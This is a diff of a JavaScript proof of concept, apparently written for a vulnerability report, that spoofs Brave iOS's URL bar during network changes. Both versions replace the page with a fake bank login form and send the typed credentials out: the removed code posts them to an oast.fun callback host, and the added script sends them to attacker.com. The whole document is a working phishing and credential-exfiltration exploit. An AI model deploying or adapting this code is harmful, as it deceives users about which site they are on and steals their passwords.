@@ -1,131 +1,28 @@
-// UI Misrepresentation POC - Brave iOS Network Change Spoof
-class NetworkSpoofer {
-    constructor() {
-        this.originalURL = 'https://legitimate-bank.com';
-        this.fakeURL = 'https://fake-phishing-site.com';
-        this.isSpoofing = false;
-    }
+<script>
+// POC: URL Bar Spoof - Network Change Race Condition
+const spoofURL = 'https://real-bank.com';
+const fakeContent = 'https://fake-phishing.com';
 
-    // Simulate network change detection
-    simulateNetworkChange() {
-        console.log('🔄 Simulating network change event...');
-        
-        // Method 1: Trigger spoof when network connectivity changes
-        window.addEventListener('online', this.hijackURLBar.bind(this));
-        window.addEventListener('offline', this.hijackURLBar.bind(this));
-        
-        // Method 2: Periodic check to exploit race condition
-        this.startPeriodicSpoof();
-    }
+// Trigger on network change
+window.addEventListener('online', startSpoof);
 
-    hijackURLBar() {
-        if (!this.isSpoofing) {
-            this.isSpoofing = true;
-            
-            // Exploit: Browser shows old URL during network transition
-            this.freezeURLBar(this.originalURL);
-            
-            // Meanwhile, page content changes to phishing site
-            this.loadMaliciousContent();
-            
-            console.log('🎭 URL Bar Spoof Active:');
-            console.log(`   URL Bar shows: ${this.originalURL}`);
-            console.log(`   Actual content: ${this.fakeURL}`);
-        }
-    }
-
-    freezeURLBar(displayURL) {
-        // Technique: Create multiple rapid navigation events
-        // to confuse the URL bar update mechanism
-        for (let i = 0; i < 5; i++) {
-            setTimeout(() => {
-                // Push state to manipulate history without updating URL bar
-                window.history.pushState(
-                    { page: 'spoofed' },
-                    '',
-                    displayURL
-                );
-            }, i * 100);
-        }
-
-        // Block further URL updates
-        this.overrideHistoryMethods();
-    }
-
-    overrideHistoryMethods() {
-        const originalPushState = history.pushState;
-        const originalReplaceState = history.replaceState;
-
-        history.pushState = function(state, title, url) {
-            // Ignore any attempts to update the URL
-            return originalPushState.call(history, state, title, '/');
-        };
-
-        history.replaceState = function(state, title, url) {
-            // Block URL replacements
-            return originalReplaceState.call(history, state, title, '/');
-        };
-    }
-
-    loadMaliciousContent() {
-        // Replace page content with phishing material
-        document.body.innerHTML = `
-            <div style="font-family: Arial; padding: 20px;">
-                <h1>🔒 Secure Banking Login</h1>
-                <p>Please re-authenticate due to network changes</p>
-                <form onsubmit="stealCredentials()">
-                    <input type="text" id="username" placeholder="Username" required>
-                    <input type="password" id="password" placeholder="Password" required>
-                    <button type="submit">Login</button>
-                </form>
-            </div>
-        `;
-    }
-
-    startPeriodicSpoof() {
-        // Trigger spoof every 30 seconds to catch network changes
-        setInterval(() => {
-            if (navigator.onLine) {
-                this.hijackURLBar();
-            }
-        }, 30000);
-    }
+function startSpoof() {
+    // Freeze URL bar showing legitimate site
+    history.replaceState({}, '', spoofURL);
+    
+    // Replace page content with phishing site
+    document.body.innerHTML = `
+        <h1>Login Required</h1>
+        <input id="user" placeholder="Username">
+        <input id="pass" type="password" placeholder="Password">
+        <button onclick="steal()">Login</button>
+    `;
 }
 
-// Steal credentials function
-function stealCredentials() {
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    
-    console.log('📧 Credentials captured:');
-    console.log(`   Username: ${username}`);
-    console.log(`   Password: ${password}`);
-    
-    // Send to attacker server (simulated)
-    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-        method: 'POST',
-        body: JSON.stringify({ username, password })
-    });
-    
-    alert('Login failed. Please try again.');
-    return false;
+function steal() {
+    const user = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
+    // Send stolen credentials
+    fetch('https://attacker.com/log?u=' + user + '&p=' + pass);
 }
-
-// Auto-execute when page loads
-document.addEventListener('DOMContentLoaded', () => {
-    const spoofer = new NetworkSpoofer();
-    
-    // Wait for page to fully load then trigger spoof
-    setTimeout(() => {
-        spoofer.simulateNetworkChange();
-    }, 2000);
-});
-
-// Additional: Exploit page visibility changes
-document.addEventListener('visibilitychange', () => {
-    if (!document.hidden) {
-        // Re-trigger spoof when user returns to tab
-        const spoofer = new NetworkSpoofer();
-        spoofer.hijackURLBar();
-    }
-});
+    </script>
